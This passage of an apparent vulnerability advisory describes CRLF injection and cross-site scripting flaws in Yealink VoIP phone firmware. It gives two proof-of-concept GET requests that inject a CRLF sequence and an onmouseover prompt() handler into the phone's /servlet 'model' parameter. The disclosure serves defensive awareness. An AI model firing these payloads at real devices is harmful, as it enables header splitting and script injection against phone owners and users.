II.	BACKGROUND

Yealink is a manufacturer of VoIP and Video products. To

http://www.yealink.com/Companyprofile.aspx


III.	DESCRIPTION

There are CRLF Injection and XSS vulnerabilities in Yealink
VoIP telephones. Validated on 

Firmware Version        28.72.0.2
Hardware Version        28.2.0.128.0.0.0

CRLF Injection (Header Splitting) proof of concept:

Request
GET /servlet?linepage=1&model=%0d%0a%20 ANYTHING I WANT GOES HERE &p=dsskey&q=load HTTP/1.1

In the above request, attackers can shove in code, webpages,
etc. In my tests, I have used javascript, redirects, and even
an entire web page shoved into the CRLF vulnerable inputs.


-----


The XSS vulnerability

GET /servlet?jumpto=dsskey&model=%22%20onmouseover%3dprompt%28 1337 %29%20badpuppy%3d%22&p=login&q=loginForm HTTP/1.1
